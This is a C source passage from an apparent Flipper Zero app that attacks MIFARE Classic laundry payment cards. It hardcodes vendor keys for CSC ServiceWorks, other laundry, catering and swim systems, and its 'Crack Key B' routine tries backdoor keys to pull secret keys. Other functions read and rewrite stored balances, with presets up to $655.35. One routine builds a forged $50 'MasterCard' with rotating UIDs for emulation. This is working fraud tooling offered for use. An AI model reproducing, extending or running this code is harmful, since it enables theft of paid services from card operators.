        {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},  // Blank
        {{0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}},  // MAD A
        {{0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}},  // MAD B
        {{0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}},  // Common
        {{0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F}},  // CSC
        {{0x07, 0x34, 0xBF, 0xB9, 0x3D, 0xAB}},  // Laundry 1
        {{0x85, 0xA4, 0x38, 0xF7, 0x2A, 0x8A}},  // Laundry 2
        {{0x21, 0x22, 0x23, 0x24, 0x25, 0x55}},  // Laundry 3
        {{0x71, 0x72, 0x73, 0x74, 0x75, 0x55}},  // Laundry 4
        {{0x29, 0x1A, 0x65, 0xCB, 0xEA, 0x7B}},  // Laundry 5
        {{0x34, 0x4A, 0x35, 0x9B, 0xBA, 0xD9}},  // Laundry 6
        {{0x47, 0x65, 0x72, 0x72, 0x61, 0x72}},  // Gerrar
        {{0x4D, 0x69, 0x63, 0x68, 0x65, 0x6C}},  // Michel
        {{0x4F, 0x37, 0x48, 0xE6, 0xC8, 0x26}},  // Laundry 9
        {{0x69, 0xD4, 0x0A, 0xF8, 0xB3, 0x53}},  // Laundry 10
        {{0x72, 0xDE, 0xA1, 0x0F, 0x21, 0xDF}},  // Laundry 11
        {{0x74, 0x84, 0x5A, 0xA8, 0xE3, 0xF1}},  // Laundry 12
        {{0x8C, 0x3C, 0x43, 0xED, 0xCC, 0x55}},  // Laundry 13
        {{0xAC, 0xD3, 0x0D, 0xFF, 0xB4, 0x34}},  // Laundry 14
        {{0xD1, 0xA2, 0x7C, 0x8E, 0xC5, 0xDF}},  // Laundry 15
        {{0xF1, 0x4D, 0x32, 0x9C, 0xBD, 0xBE}},  // Laundry 16
        {{0x6A, 0x0D, 0x53, 0x1D, 0xA1, 0xA7}},  // Catering 1
        {{0x4B, 0xB2, 0x94, 0x63, 0xDC, 0x29}},  // Catering 2
        {{0x86, 0x27, 0xC1, 0x0A, 0x70, 0x14}},  // Swim 1
        {{0x45, 0x38, 0x57, 0x39, 0x56, 0x35}},  // Swim 2
    };
    static const size_t num_test_keys = sizeof(test_keys) / sizeof(test_keys[0]);

    // Stop emulation first - listener depends on app->nfc
    if(app->emulating) {
        laundr_stop_emulation(app);
    }

    // Show waiting screen
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Testing Keys");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, "Place card on Flipper");
    widget_add_string_element(app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, "Testing all 26 keys...");
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    // Free any existing NFC instance to prevent bus fault
    if(app->nfc) {
        nfc_free(app->nfc);
        app->nfc = NULL;
    }

    // Allocate NFC
    Nfc* nfc = nfc_alloc();
    if(!nfc) {
        laundr_log_system("Failed to allocate NFC");
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontPrimary, "NFC Error");
        return;
    }

    // Wait for card
    MfClassicBlock test_block;
    MfClassicError error = MfClassicErrorNotPresent;
    bool card_found = false;

    for(int retry = 0; retry < 100 && !card_found; retry++) {
        for(size_t k = 0; k < 6; k++) {
            MfClassicKey key;
            memcpy(&key, &test_keys[k], sizeof(MfClassicKey));
            error = mf_classic_poller_sync_read_block(nfc, 0, &key, MfClassicKeyTypeA, &test_block);
            if(error == MfClassicErrorNone) {
                card_found = true;
                break;
            }
        }
        if(!card_found) furi_delay_ms(100);
    }

    if(!card_found) {
        nfc_free(nfc);
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontPrimary, "No Card Found");
        widget_add_string_element(app->widget, 64, 45, AlignCenter, AlignTop, FontSecondary, "Timed out");
        return;
    }

    // Card found - now test all keys on sectors 1 and 2 (blocks 4 and 8)
    laundr_log_transaction("=== KEY TEST RESULTS ===");
    laundr_log_transaction("Testing %zu keys on card...", num_test_keys);

    int read_success_count = 0;
    int write_success_count = 0;
    int read_key_idx = -1;
    int write_key_idx = -1;
    char read_key_type = '?';
    char write_key_type = '?';

    // Test each key for read and write on block 4
    for(size_t k = 0; k < num_test_keys; k++) {
        MfClassicKey key;
        memcpy(&key, &test_keys[k], sizeof(MfClassicKey));

        // Test read with Key A
        error = mf_classic_poller_sync_read_block(nfc, 4, &key, MfClassicKeyTypeA, &test_block);
        if(error == MfClassicErrorNone) {
            read_success_count++;
            if(read_key_idx < 0) {
                read_key_idx = k;
                read_key_type = 'A';
            }
            laundr_log_transaction("Key[%zu] KeyA: READ OK", k);
        }

        // Test read with Key B
        error = mf_classic_poller_sync_read_block(nfc, 4, &key, MfClassicKeyTypeB, &test_block);
        if(error == MfClassicErrorNone) {
            read_success_count++;
            if(read_key_idx < 0) {
                read_key_idx = k;
                read_key_type = 'B';
            }
            laundr_log_transaction("Key[%zu] KeyB: READ OK", k);
        }

        // Test write with Key A (write original data back - non-destructive)
        MfClassicBlock write_block;
        memcpy(&write_block, &test_block, sizeof(MfClassicBlock));
        error = mf_classic_poller_sync_write_block(nfc, 4, &key, MfClassicKeyTypeA, &write_block);
        if(error == MfClassicErrorNone) {
            write_success_count++;
            if(write_key_idx < 0) {
                write_key_idx = k;
                write_key_type = 'A';
            }
            laundr_log_transaction("Key[%zu] KeyA: WRITE OK <<<", k);
        }

        // Test write with Key B
        error = mf_classic_poller_sync_write_block(nfc, 4, &key, MfClassicKeyTypeB, &write_block);
        if(error == MfClassicErrorNone) {
            write_success_count++;
            if(write_key_idx < 0) {
                write_key_idx = k;
                write_key_type = 'B';
            }
            laundr_log_transaction("Key[%zu] KeyB: WRITE OK <<<", k);
        }
    }

    nfc_free(nfc);

    // Show results
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Key Test Complete");

    snprintf(app->widget_str1, sizeof(app->widget_str1), "Read: %d  Write: %d", read_success_count, write_success_count);
    widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignTop, FontSecondary, app->widget_str1);

    if(read_key_idx >= 0) {
        snprintf(app->widget_str2, sizeof(app->widget_str2), "Read Key: [%d] Key%c", read_key_idx, read_key_type);
        widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontSecondary, app->widget_str2);
    } else {
        widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontSecondary, "Read: NO KEY FOUND");
    }

    if(write_key_idx >= 0) {
        snprintf(app->widget_str3, sizeof(app->widget_str3), "Write Key: [%d] Key%c", write_key_idx, write_key_type);
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, app->widget_str3);
    } else {
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, "Write: NO KEY FOUND");
    }

    widget_add_string_element(app->widget, 64, 55, AlignCenter, AlignTop, FontSecondary, "Check transaction log");

    laundr_log_transaction("=== TEST COMPLETE ===");
    laundr_log_transaction("Read successes: %d, Write successes: %d", read_success_count, write_success_count);
    if(write_key_idx >= 0) {
        laundr_log_transaction("WRITE KEY FOUND: Index %d, Type Key%c", write_key_idx, write_key_type);
    } else {
        laundr_log_transaction("NO WRITE KEY FOUND - card may be write-protected or use unknown key");
    }

    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_widget_input_callback);
    view_set_context(widget_view, app);
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    if(app->notifications) {
        notification_message(app->notifications, &sequence_success);
    }
}

// ============================================================================
// CRACK KEY B - Try backdoor keys to extract Key B from sector trailer
// ============================================================================

static void laundr_crack_key_b(LaundRApp* app) {
    laundr_log_system(">>> Crack Key B initiated");
    laundr_log_transaction("=== CRACK KEY B - BACKDOOR ATTACK ===");

    // Backdoor keys for MIFARE Classic clones
    static const MfClassicKey backdoor_keys[] = {
        {{0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F}},  // Fudan (static encrypted)
        {{0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1}},  // Fudan/Infineon/NXP
        {{0x51, 0x8B, 0x33, 0x54, 0xE7, 0x60}},  // Fudan 2
        {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}},  // Default
        {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}},  // Blank
        {{0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F}},  // CSC Key A
    };
    static const char* backdoor_names[] = {
        "Fudan Static", "Fudan/NXP", "Fudan 2", "Default", "Blank", "CSC Key A",
    };
    static const size_t num_backdoor_keys = sizeof(backdoor_keys) / sizeof(backdoor_keys[0]);

    // Stop emulation first - listener depends on app->nfc
    if(app->emulating) {
        laundr_stop_emulation(app);
    }

    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Crack Key B");
    widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontSecondary, "Place card on Flipper");
    widget_add_string_element(app->widget, 64, 35, AlignCenter, AlignTop, FontSecondary, "Trying backdoor keys...");
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    // Free any existing NFC instance to prevent bus fault
    if(app->nfc) {
        nfc_free(app->nfc);
        app->nfc = NULL;
    }

    Nfc* nfc = nfc_alloc();
    if(!nfc) {
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontPrimary, "NFC Error");
        return;
    }

    // Sector 1 trailer = block 7, Key B at bytes 10-15
    const uint8_t target_block = 7;
    MfClassicBlock trailer_block;
    MfClassicError error;
    bool key_b_found = false;
    uint8_t found_key_b[6] = {0};
    int found_idx = -1;

    for(int retry = 0; retry < 50 && !key_b_found; retry++) {
        for(size_t k = 0; k < num_backdoor_keys && !key_b_found; k++) {
            MfClassicKey key;
            memcpy(&key, &backdoor_keys[k], sizeof(MfClassicKey));

            error = mf_classic_poller_sync_read_block(nfc, target_block, &key, MfClassicKeyTypeA, &trailer_block);
            if(error == MfClassicErrorNone) {
                memcpy(found_key_b, &trailer_block.data[10], 6);
                laundr_log_transaction("[%zu] %s: TRAILER READ!", k, backdoor_names[k]);
                laundr_log_transaction("Key B: %02X%02X%02X%02X%02X%02X",
                    found_key_b[0], found_key_b[1], found_key_b[2],
                    found_key_b[3], found_key_b[4], found_key_b[5]);
                key_b_found = true;
                found_idx = k;
                break;
            }

            error = mf_classic_poller_sync_read_block(nfc, target_block, &key, MfClassicKeyTypeB, &trailer_block);
            if(error == MfClassicErrorNone) {
                memcpy(found_key_b, &trailer_block.data[10], 6);
                laundr_log_transaction("[%zu] %s KeyB: TRAILER READ!", k, backdoor_names[k]);
                key_b_found = true;
                found_idx = k;
                break;
            }
        }
        if(!key_b_found) furi_delay_ms(100);
    }

    nfc_free(nfc);

    widget_reset(app->widget);
    if(key_b_found) {
        widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "KEY B FOUND!");
        snprintf(app->widget_str1, sizeof(app->widget_str1), "%02X%02X%02X%02X%02X%02X",
            found_key_b[0], found_key_b[1], found_key_b[2],
            found_key_b[3], found_key_b[4], found_key_b[5]);
        widget_add_string_element(app->widget, 64, 18, AlignCenter, AlignTop, FontPrimary, app->widget_str1);
        snprintf(app->widget_str2, sizeof(app->widget_str2), "Via: %s", backdoor_names[found_idx]);
        widget_add_string_element(app->widget, 64, 34, AlignCenter, AlignTop, FontSecondary, app->widget_str2);
        widget_add_string_element(app->widget, 64, 48, AlignCenter, AlignTop, FontSecondary, "Add to LaundR keys!");
        laundr_log_transaction("=== KEY B: %02X%02X%02X%02X%02X%02X ===",
            found_key_b[0], found_key_b[1], found_key_b[2],
            found_key_b[3], found_key_b[4], found_key_b[5]);
        if(app->notifications) notification_message(app->notifications, &sequence_success);
    } else {
        widget_add_string_element(app->widget, 64, 10, AlignCenter, AlignTop, FontPrimary, "No Backdoor Found");
        widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontSecondary, "Card is genuine MFC");
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, "Use washer to capture");
        widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, "nonces for MFKey32");
        laundr_log_transaction("No backdoor - use washer nonce capture");
        if(app->notifications) notification_message(app->notifications, &sequence_error);
    }

    View* wv = widget_get_view(app->widget);
    view_set_input_callback(wv, laundr_widget_input_callback);
    view_set_context(wv, app);
}

// ============================================================================
// READ CARD FUNCTION
// ============================================================================

static void laundr_read_card(LaundRApp* app) {
    laundr_log_system(">>> Read Card initiated");

    // Stop emulation first - listener depends on app->nfc
    if(app->emulating) {
        laundr_stop_emulation(app);
    }

    // Show reading screen
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignTop, FontPrimary, "Reading Card...");
    widget_add_string_element(app->widget, 64, 25, AlignCenter, AlignTop, FontSecondary, "Place CSC card on");
    widget_add_string_element(app->widget, 64, 37, AlignCenter, AlignTop, FontSecondary, "back of Flipper");

    View* widget_view = widget_get_view(app->widget);
    view_set_input_callback(widget_view, laundr_widget_input_callback);
    view_set_context(widget_view, app);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
    furi_delay_ms(300);

    // Free any existing NFC instance to prevent bus fault
    if(app->nfc) {
        nfc_free(app->nfc);
        app->nfc = NULL;
    }

    // Allocate NFC for reading
    Nfc* nfc = nfc_alloc();
    if(!nfc) {
        laundr_log_system("Read Card failed: could not allocate NFC");
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 30, AlignCenter, AlignTop, FontPrimary, "NFC Error!");
        widget_add_string_element(app->widget, 64, 50, AlignCenter, AlignTop, FontSecondary, "Press BACK");
        return;
    }

    // CSC ServiceWorks Key A
    MfClassicKey csc_key = {{0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F}};

    // Try to read key blocks with retry loop
    MfClassicBlock block0, block1, block2, block4, block8, block9, block13;
    bool read_success = false;
    const char* error_msg = NULL;

    // Retry loop - wait for card to be present
    MfClassicError error = MfClassicErrorNotPresent;
    int max_retries = 100;  // ~10 seconds of waiting
    int retry = 0;

    widget_add_string_element(app->widget, 64, 52, AlignCenter, AlignTop, FontSecondary, "Waiting for card...");
    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    while(retry < max_retries) {
        // Read block 0 (UID/manufacturer)
        error = mf_classic_poller_sync_read_block(
            nfc, 0, &csc_key, MfClassicKeyTypeA, &block0);

        if(error == MfClassicErrorNone) {
            read_success = true;
            break;  // Success!
        }

        if(error != MfClassicErrorNotPresent && error != MfClassicErrorTimeout) {
            break;  // Real error (auth failed, etc.), stop retrying
        }

        // No card yet, wait and retry
        furi_delay_ms(100);
        retry++;
    }

    if(!read_success) {
        error_msg = (error == MfClassicErrorNotPresent) ? "No card found (timeout)" :
                    (error == MfClassicErrorAuth) ? "Auth failed (not CSC?)" :
                    (error == MfClassicErrorTimeout) ? "Timeout" : "Read error";
    }

    if(read_success) {
        // Read remaining blocks
        mf_classic_poller_sync_read_block(nfc, 1, &csc_key, MfClassicKeyTypeA, &block1);
        mf_classic_poller_sync_read_block(nfc, 2, &csc_key, MfClassicKeyTypeA, &block2);
        mf_classic_poller_sync_read_block(nfc, 4, &csc_key, MfClassicKeyTypeA, &block4);
        mf_classic_poller_sync_read_block(nfc, 8, &csc_key, MfClassicKeyTypeA, &block8);
        mf_classic_poller_sync_read_block(nfc, 9, &csc_key, MfClassicKeyTypeA, &block9);
        mf_classic_poller_sync_read_block(nfc, 13, &csc_key, MfClassicKeyTypeA, &block13);
    }

    nfc_free(nfc);

    if(!read_success) {
        laundr_log_system("Read Card FAILED: %s", error_msg);
        widget_reset(app->widget);
        widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignTop, FontPrimary, "Read Failed!");
        widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, error_msg);
        widget_add_string_element(app->widget, 64, 55, AlignCenter, AlignTop, FontSecondary, "Press BACK");
        view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);
        return;
    }

    // Parse the read data
    // UID from block 0
    uint8_t uid[4] = {block0.data[0], block0.data[1], block0.data[2], block0.data[3]};

    // Balance from block 4
    uint16_t balance = (uint16_t)block4.data[0] | ((uint16_t)block4.data[1] << 8);
    uint16_t balance_inv = (uint16_t)block4.data[4] | ((uint16_t)block4.data[5] << 8);
    bool balance_valid = ((balance ^ balance_inv) == 0xFFFF);

    // Site code from block 13
    char site_code[11] = {0};
    for(int i = 0; i < 10; i++) {
        uint8_t c = block13.data[i];
        if(c >= 0x20 && c <= 0x7E) {
            site_code[i] = (char)c;
        } else if(c == 0) {
            break;
        } else {
            site_code[i] = '.';
        }
    }

    laundr_log_system("Read Card SUCCESS: UID=%02X%02X%02X%02X Balance=$%.2f",
        uid[0], uid[1], uid[2], uid[3], (double)balance / 100);
    laundr_log_transaction("");
    laundr_log_transaction("======================================");
    laundr_log_transaction("         CARD READ SUCCESS            ");
    laundr_log_transaction("======================================");
    laundr_log_transaction("UID: %02X %02X %02X %02X", uid[0], uid[1], uid[2], uid[3]);
    laundr_log_transaction("Balance: $%.2f (%s)", (double)balance / 100, balance_valid ? "valid" : "INVALID");
    laundr_log_transaction("Site: %s", site_code);

    // Copy to app's modified_blocks for potential loading
    memcpy(app->modified_blocks[0], block0.data, 16);
    memcpy(app->modified_blocks[1], block1.data, 16);
    memcpy(app->modified_blocks[2], block2.data, 16);
    memcpy(app->modified_blocks[4], block4.data, 16);
    memcpy(app->modified_blocks[8], block8.data, 16);
    memcpy(app->modified_blocks[9], block9.data, 16);
    memcpy(app->modified_blocks[13], block13.data, 16);

    app->modified_block_valid[0] = true;
    app->modified_block_valid[1] = true;
    app->modified_block_valid[2] = true;
    app->modified_block_valid[4] = true;
    app->modified_block_valid[8] = true;
    app->modified_block_valid[9] = true;
    app->modified_block_valid[13] = true;

    // Also copy to original blocks
    memcpy(app->original_blocks, app->modified_blocks, sizeof(app->original_blocks));
    memcpy(app->original_block_valid, app->modified_block_valid, sizeof(app->original_block_valid));

    // Set up sector trailers with CSC key
    const uint8_t csc_key_bytes[] = {0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F};
    for(int sector = 0; sector < 16; sector++) {
        int trailer = sector * 4 + 3;
        memset(app->modified_blocks[trailer], 0xFF, 16);
        memcpy(app->modified_blocks[trailer], csc_key_bytes, 6);
        app->modified_blocks[trailer][6] = 0xFF;
        app->modified_blocks[trailer][7] = 0x07;
        app->modified_blocks[trailer][8] = 0x80;
        app->modified_blocks[trailer][9] = 0x69;
        memcpy(app->modified_blocks[trailer] + 10, csc_key_bytes, 6);
        app->modified_block_valid[trailer] = true;
        app->original_block_valid[trailer] = true;
        memcpy(app->original_blocks[trailer], app->modified_blocks[trailer], 16);
    }

    // Update app state
    snprintf(app->uid, sizeof(app->uid), "%02X%02X%02X%02X", uid[0], uid[1], uid[2], uid[3]);
    app->balance = balance;
    app->original_balance = balance;
    snprintf(app->provider, sizeof(app->provider), "CSC (Read)");
    app->card_loaded = true;
    app->has_modifications = false;

    // Parse balance properly
    laundr_detect_provider(app);
    laundr_parse_balance(app);
    laundr_rebuild_submenu(app);

    // Show success with card info (use persistent buffers to avoid crash)
    widget_reset(app->widget);
    widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary, "Card Read OK!");

    snprintf(app->widget_str1, sizeof(app->widget_str1), "UID: %02X%02X%02X%02X", uid[0], uid[1], uid[2], uid[3]);
    widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignTop, FontSecondary, app->widget_str1);

    snprintf(app->widget_str2, sizeof(app->widget_str2), "Balance: $%.2f", (double)balance / 100);
    widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontSecondary, app->widget_str2);

    snprintf(app->widget_str3, sizeof(app->widget_str3), "Site: %s", site_code);
    widget_add_string_element(app->widget, 64, 40, AlignCenter, AlignTop, FontSecondary, app->widget_str3);

    widget_add_string_element(app->widget, 64, 55, AlignCenter, AlignTop, FontSecondary, "Card loaded! Press BACK");

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewWidget);

    if(app->notifications) {
        notification_message(app->notifications, &sequence_success);
    }
}

// ============================================================================
// BALANCE PRESET FUNCTION
// ============================================================================

static void laundr_set_balance_preset(LaundRApp* app, uint16_t cents) {
    if(!app || !app->card_loaded) {
        laundr_log_system("Balance preset failed: no card loaded");
        return;
    }

    if(!app->popup) {
        laundr_log_system("Balance preset failed: popup not allocated");
        return;
    }

    uint16_t old_balance = app->balance;
    laundr_update_balance(app, cents);
    laundr_parse_balance(app);
    laundr_rebuild_submenu(app);

    laundr_log_system("Balance preset: $%.2f -> $%.2f", (double)old_balance / 100, (double)cents / 100);
    laundr_log_transaction("Balance changed: $%.2f -> $%.2f", (double)old_balance / 100, (double)cents / 100);

    // Show confirmation popup (use persistent buffer to avoid crash)
    popup_reset(app->popup);
    popup_set_header(app->popup, "Balance Set!", 64, 10, AlignCenter, AlignTop);

    snprintf(app->widget_str1, sizeof(app->widget_str1), "$%.2f -> $%.2f", (double)old_balance / 100, (double)cents / 100);
    popup_set_text(app->popup, app->widget_str1, 64, 35, AlignCenter, AlignCenter);
    popup_set_timeout(app->popup, 1500);
    popup_enable_timeout(app->popup);
    popup_set_context(app->popup, app);
    popup_set_callback(app->popup, NULL);

    view_dispatcher_switch_to_view(app->view_dispatcher, LaundRViewPopup);

    if(app->notifications) {
        notification_message(app->notifications, &sequence_success);
    }
}

static void laundr_rebuild_submenu(LaundRApp* app) {
    // Rebuild menu silently (this is called frequently, don't spam logs)
    if(!app || !app->submenu) {
        return;
    }

    // DON'T stop emulation here - that's handled by the widget exit callback
    // This function ONLY rebuilds the menu based on current app state

    submenu_reset(app->submenu);

    // Primary actions at top
    submenu_add_item(
        app->submenu, "CSC SW MasterCard", LaundRSubmenuIndexCSCMasterCard, laundr_submenu_callback, app);

    submenu_add_item(
        app->submenu, "Load Card", LaundRSubmenuIndexLoadCard, laundr_submenu_callback, app);

    if(app->card_loaded) {
        submenu_add_item(
            app->submenu, "View Card Info", LaundRSubmenuIndexViewCardInfo, laundr_submenu_callback, app);
    }

    submenu_add_item(
        app->submenu, "Transaction Stats", LaundRSubmenuIndexViewTransactionStats, laundr_submenu_callback, app);

    submenu_add_item(
        app->submenu, "Read Reader/Card", LaundRSubmenuIndexReadCard, laundr_submenu_callback, app);

    submenu_add_item(
        app->submenu, "Test Card Keys", LaundRSubmenuIndexTestCardKeys, laundr_submenu_callback, app);

    submenu_add_item(
        app->submenu, "Crack Key B (Backdoor)", LaundRSubmenuIndexCrackKeyB, laundr_submenu_callback, app);

    // Write to physical card (only when card loaded)
    if(app->card_loaded) {
        submenu_add_item(
            app->submenu, "Write to Card", LaundRSubmenuIndexWriteToCard, laundr_submenu_callback, app);
    }

    // Card-specific options
    if(app->card_loaded) {
        if(app->emulating) {
            submenu_add_item(
                app->submenu, "Stop Emulation", LaundRSubmenuIndexStopEmulation, laundr_submenu_callback, app);
        } else {
            submenu_add_item(
                app->submenu, "Start Emulation", LaundRSubmenuIndexStartEmulation, laundr_submenu_callback, app);
        }

        if(app->has_modifications) {
            submenu_add_item(
                app->submenu, "Apply Changes", LaundRSubmenuIndexApplyChanges, laundr_submenu_callback, app);
            submenu_add_item(
                app->submenu, "Revert Changes", LaundRSubmenuIndexRevertChanges, laundr_submenu_callback, app);
        }

        submenu_add_item(
            app->submenu, "Edit Balance", LaundRSubmenuIndexEditBalance, laundr_submenu_callback, app);

        // Quick balance presets
        submenu_add_item(
            app->submenu, "Set $10.00", LaundRSubmenuIndexSetBalance10, laundr_submenu_callback, app);
        submenu_add_item(
            app->submenu, "Set $25.00", LaundRSubmenuIndexSetBalance25, laundr_submenu_callback, app);
        submenu_add_item(
            app->submenu, "Set $50.00", LaundRSubmenuIndexSetBalance50, laundr_submenu_callback, app);
        submenu_add_item(
            app->submenu, "Set $100.00", LaundRSubmenuIndexSetBalance100, laundr_submenu_callback, app);
        submenu_add_item(
            app->submenu, "Set MAX $655.35", LaundRSubmenuIndexSetBalanceMax, laundr_submenu_callback, app);

        submenu_add_item(
            app->submenu, "View Blocks", LaundRSubmenuIndexViewBlocks, laundr_submenu_callback, app);
        submenu_add_item(
            app->submenu, "Edit Block", LaundRSubmenuIndexEditBlock, laundr_submenu_callback, app);
    }

    submenu_add_item(
        app->submenu, "View Log", LaundRSubmenuIndexViewLog, laundr_submenu_callback, app);
    submenu_add_item(
        app->submenu, "Clear Log", LaundRSubmenuIndexClearLog, laundr_submenu_callback, app);

    // Master-Key Audit - works with or without a loaded card
    submenu_add_item(
        app->submenu, "🔑 Master-Key Audit", LaundRSubmenuIndexMasterKeyAudit, laundr_submenu_callback, app);

    // Mode selector (toggles between HACK ↔ LEGIT only)
    submenu_add_item(
        app->submenu,
        app->mode == LaundRModeHack ? "Mode: HACK" : "Mode: LEGIT",
        app->mode == LaundRModeHack ? LaundRSubmenuIndexHackMode : LaundRSubmenuIndexLegitMode,
        laundr_submenu_callback,
        app);

    submenu_add_item(
        app->submenu, "About", LaundRSubmenuIndexAbout, laundr_submenu_callback, app);
}

// ============================================================================
// CALLBACKS
// ============================================================================

static void laundr_text_input_callback(void* context) {
    LaundRApp* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, 0);
}

static void laundr_byte_input_callback(void* context) {
    LaundRApp* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, 1);
}

static bool laundr_custom_event_callback(void* context, uint32_t event) {
    LaundRApp* app = context;

    laundr_log_write(">>> laundr_custom_event_callback() called with event=%lu", event);

    // Validate app pointer
    if(!app) {
        FURI_LOG_E(TAG, "NULL app in custom event callback");
        laundr_log_write("ERROR: NULL app in custom event callback");
        return false;
    }

    if(event == 0) {
        // Text input completed
        double balance_dollars = strtod(app->text_input_buffer, NULL);
        uint16_t balance_cents = (uint16_t)(balance_dollars * 100);

        laundr_update_balance(app, balance_cents);
        laundr_parse_balance(app);
        laundr_rebuild_submenu(app);
        laundr_show_card_info(app);

        return true;
    } else if(event == 1) {
        // Byte input completed
        memcpy(app->modified_blocks[app->current_block_edit], app->byte_input_buffer, 16);
        app->has_modifications = true;
        laundr_parse_balance(app);
        laundr_rebuild_submenu(app);
        laundr_show_card_info(app);
        return true;
    }

    return false;
}

// Load embedded CSC ServiceWorks MasterCard (always works on CSC systems)
static void laundr_load_csc_mastercard(LaundRApp* app) {
    if(!app) return;

    laundr_log_write("Loading embedded CSC SW MasterCard...");

    // CRITICAL: Stop any active emulation and clear previous card state
    if(app->nfc_listener) {
        laundr_log_write("Stopping previous emulation before loading MasterCard");
        nfc_listener_stop(app->nfc_listener);
        nfc_listener_free(app->nfc_listener);
        app->nfc_listener = NULL;
    }
    app->emulating = false;

    // Reset ALL card state completely
    memset(app->original_blocks, 0, sizeof(app->original_blocks));
    memset(app->original_block_valid, 0, sizeof(app->original_block_valid));
    memset(app->modified_blocks, 0, sizeof(app->modified_blocks));
    memset(app->modified_block_valid, 0, sizeof(app->modified_block_valid));
    memset(app->emulation_blocks, 0, sizeof(app->emulation_blocks));
    memset(app->emulation_block_valid, 0, sizeof(app->emulation_block_valid));
    app->reads = 0;
    app->writes = 0;
    app->writes_blocked = 0;
    app->transaction_count = 0;

    // CSC ServiceWorks master key
    const uint8_t csc_key_a[] = {0xEE, 0xB7, 0x06, 0xFC, 0x71, 0x4F};
    const uint8_t key_b_ff[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // Build a working $50.00 CSC card with ROTATING UID
    // Sector 0, Block 0: UID + BCC + manufacturer data
    uint8_t block0[] = {0xDB, 0xDC, 0xDA, 0x74, 0xA9, 0x08, 0x04, 0x00,
                        0x04, 0xF0, 0x35, 0x6B, 0x3D, 0xB6, 0xE9, 0x90};

    // Generate pseudo-random 4-byte UID using tick counter
    // Spread the tick value across all 4 bytes to avoid zeros
    uint32_t tick_value = furi_get_tick();
    block0[0] = (uint8_t)(tick_value & 0xFF);
    block0[1] = (uint8_t)((tick_value >> 8) & 0xFF);
    block0[2] = (uint8_t)((tick_value >> 16) & 0xFF);
    block0[3] = (uint8_t)((tick_value >> 24) & 0xFF) | 0x01;  // Ensure not all zeros

    // Calculate BCC (XOR of UID bytes)
    block0[4] = block0[0] ^ block0[1] ^ block0[2] ^ block0[3];

    // Store UID as decimal
    app->current_uid_decimal = (block0[0] << 24) | (block0[1] << 16) | (block0[2] << 8) | block0[3];

    laundr_log_write("Generated random UID: %02X %02X %02X %02X (BCC: %02X) = %u decimal",
        block0[0], block0[1], block0[2], block0[3], block0[4], app->current_uid_decimal);

    memcpy(app->original_blocks[0], block0, 16);
    app->original_block_valid[0] = true;

    // Sector 0, Block 1
    uint8_t block1[] = {0x30, 0x30, 0x00, 0x01, 0x00, 0x00, 0x01, 0x84,
                        0x28, 0x30, 0x00, 0x00, 0x01, 0x11, 0xEE, 0x62};
    memcpy(app->original_blocks[1], block1, 16);
    app->original_block_valid[1] = true;

    // Sector 0, Block 2
    uint8_t block2[] = {0x01, 0x01, 0xC5, 0xCB, 0xAB, 0x70, 0x00, 0x00,
                        0x00, 0x88, 0x13, 0x01, 0x00, 0x00, 0x00, 0x4F};
    memcpy(app->original_blocks[2], block2, 16);
    app->original_block_valid[2] = true;

    // Sector 0, Block 3: Trailer with CSC key
    memcpy(app->original_blocks[3], csc_key_a, 6);
    app->original_blocks[3][6] = 0x78;  // Access bits
